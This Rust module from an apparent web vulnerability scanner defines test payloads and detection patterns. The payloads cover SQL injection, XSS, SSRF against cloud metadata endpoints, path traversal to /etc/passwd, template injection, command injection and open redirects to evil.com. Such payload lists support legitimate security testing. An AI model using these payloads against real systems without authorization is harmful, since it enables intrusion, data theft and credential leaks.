use shadowprobe_core::VulnerabilityType;

pub struct PayloadSet {
    pub vuln_type: VulnerabilityType,
    pub payloads: Vec<Payload>,
}

pub struct Payload {
    pub value: String,
    pub description: String,
    pub detection_patterns: Vec<String>,
}

impl PayloadSet {
    pub fn for_sqli() -> Self {
        Self {
            vuln_type: VulnerabilityType::SQLInjection,
            payloads: vec![
                Payload {
                    value: "' OR '1'='1".to_string(),
                    description: "Classic SQLi boolean-based".to_string(),
                    detection_patterns: vec![
                        "sql".to_string(),
                        "syntax".to_string(),
                        "mysql".to_string(),
                        "postgresql".to_string(),
                        "sqlite".to_string(),
                        "oracle".to_string(),
                    ],
                },
                Payload {
                    value: "' OR 1=1--".to_string(),
                    description: "SQLi with comment".to_string(),
                    detection_patterns: vec!["sql".to_string(), "error".to_string()],
                },
                Payload {
                    value: "' UNION SELECT NULL--".to_string(),
                    description: "UNION-based SQLi".to_string(),
                    detection_patterns: vec!["union".to_string(), "select".to_string()],
                },
                Payload {
                    value: "1' AND SLEEP(5)--".to_string(),
                    description: "Time-based blind SQLi".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "admin'--".to_string(),
                    description: "Authentication bypass".to_string(),
                    detection_patterns: vec![],
                },
            ],
        }
    }

    pub fn for_xss() -> Self {
        Self {
            vuln_type: VulnerabilityType::XSS,
            payloads: vec![
                Payload {
                    value: "<script>alert('XSS')</script>".to_string(),
                    description: "Basic XSS".to_string(),
                    detection_patterns: vec!["<script>".to_string(), "alert".to_string()],
                },
                Payload {
                    value: "<img src=x onerror=alert('XSS')>".to_string(),
                    description: "Image-based XSS".to_string(),
                    detection_patterns: vec!["<img".to_string(), "onerror".to_string()],
                },
                Payload {
                    value: "'\"><script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
                    description: "Encoded XSS".to_string(),
                    detection_patterns: vec!["<script>".to_string()],
                },
                Payload {
                    value: "<svg/onload=alert('XSS')>".to_string(),
                    description: "SVG-based XSS".to_string(),
                    detection_patterns: vec!["<svg".to_string(), "onload".to_string()],
                },
                Payload {
                    value: "javascript:alert('XSS')".to_string(),
                    description: "Protocol-based XSS".to_string(),
                    detection_patterns: vec!["javascript:".to_string()],
                },
            ],
        }
    }

    pub fn for_ssrf() -> Self {
        Self {
            vuln_type: VulnerabilityType::SSRF,
            payloads: vec![
                Payload {
                    value: "http://127.0.0.1".to_string(),
                    description: "Localhost SSRF".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "http://localhost".to_string(),
                    description: "Localhost name SSRF".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "http://169.254.169.254/latest/meta-data/".to_string(),
                    description: "AWS metadata SSRF".to_string(),
                    detection_patterns: vec!["ami-id".to_string(), "instance-id".to_string()],
                },
                Payload {
                    value: "file:///etc/passwd".to_string(),
                    description: "File protocol SSRF".to_string(),
                    detection_patterns: vec!["root:".to_string(), "/bin/".to_string()],
                },
                Payload {
                    value: "http://metadata.google.internal/".to_string(),
                    description: "GCP metadata SSRF".to_string(),
                    detection_patterns: vec![],
                },
            ],
        }
    }

    pub fn for_lfi() -> Self {
        Self {
            vuln_type: VulnerabilityType::LFI,
            payloads: vec![
                Payload {
                    value: "../../../etc/passwd".to_string(),
                    description: "Basic path traversal".to_string(),
                    detection_patterns: vec!["root:".to_string(), "/bin/bash".to_string()],
                },
                Payload {
                    value: "....//....//....//etc/passwd".to_string(),
                    description: "Double encoding traversal".to_string(),
                    detection_patterns: vec!["root:".to_string()],
                },
                Payload {
                    value: "/etc/passwd".to_string(),
                    description: "Absolute path".to_string(),
                    detection_patterns: vec!["root:".to_string()],
                },
                Payload {
                    value: "../../../windows/win.ini".to_string(),
                    description: "Windows file inclusion".to_string(),
                    detection_patterns: vec!["[fonts]".to_string(), "[extensions]".to_string()],
                },
            ],
        }
    }

    pub fn for_ssti() -> Self {
        Self {
            vuln_type: VulnerabilityType::SSTI,
            payloads: vec![
                Payload {
                    value: "{{7*7}}".to_string(),
                    description: "Jinja2/Twig math eval".to_string(),
                    detection_patterns: vec!["49".to_string()],
                },
                Payload {
                    value: "${7*7}".to_string(),
                    description: "Freemarker math eval".to_string(),
                    detection_patterns: vec!["49".to_string()],
                },
                Payload {
                    value: "{{config}}".to_string(),
                    description: "Flask config leak".to_string(),
                    detection_patterns: vec!["SECRET_KEY".to_string(), "DEBUG".to_string()],
                },
                Payload {
                    value: "<%= 7*7 %>".to_string(),
                    description: "ERB template eval".to_string(),
                    detection_patterns: vec!["49".to_string()],
                },
            ],
        }
    }

    pub fn for_command_injection() -> Self {
        Self {
            vuln_type: VulnerabilityType::CommandInjection,
            payloads: vec![
                Payload {
                    value: "; ls -la".to_string(),
                    description: "Command chaining".to_string(),
                    detection_patterns: vec!["total".to_string(), "drwx".to_string()],
                },
                Payload {
                    value: "| whoami".to_string(),
                    description: "Pipe command".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "`whoami`".to_string(),
                    description: "Backtick command substitution".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "$(whoami)".to_string(),
                    description: "Dollar command substitution".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "&& id".to_string(),
                    description: "AND command chaining".to_string(),
                    detection_patterns: vec!["uid=".to_string(), "gid=".to_string()],
                },
            ],
        }
    }

    pub fn for_open_redirect() -> Self {
        Self {
            vuln_type: VulnerabilityType::OpenRedirect,
            payloads: vec![
                Payload {
                    value: "https://evil.com".to_string(),
                    description: "Direct external redirect".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "//evil.com".to_string(),
                    description: "Protocol-relative redirect".to_string(),
                    detection_patterns: vec![],
                },
                Payload {
                    value: "/\\evil.com".to_string(),
                    description: "Backslash bypass".to_string(),
                    detection_patterns: vec![],
                },
            ],
        }
    }
}

pub fn get_all_payloads() -> Vec<PayloadSet> {
    vec![
        PayloadSet::for_sqli(),
        PayloadSet::for_xss(),
        PayloadSet::for_ssrf(),
        PayloadSet::for_lfi(),
        PayloadSet::for_ssti(),
        PayloadSet::for_command_injection(),
        PayloadSet::for_open_redirect(),
    ]
}
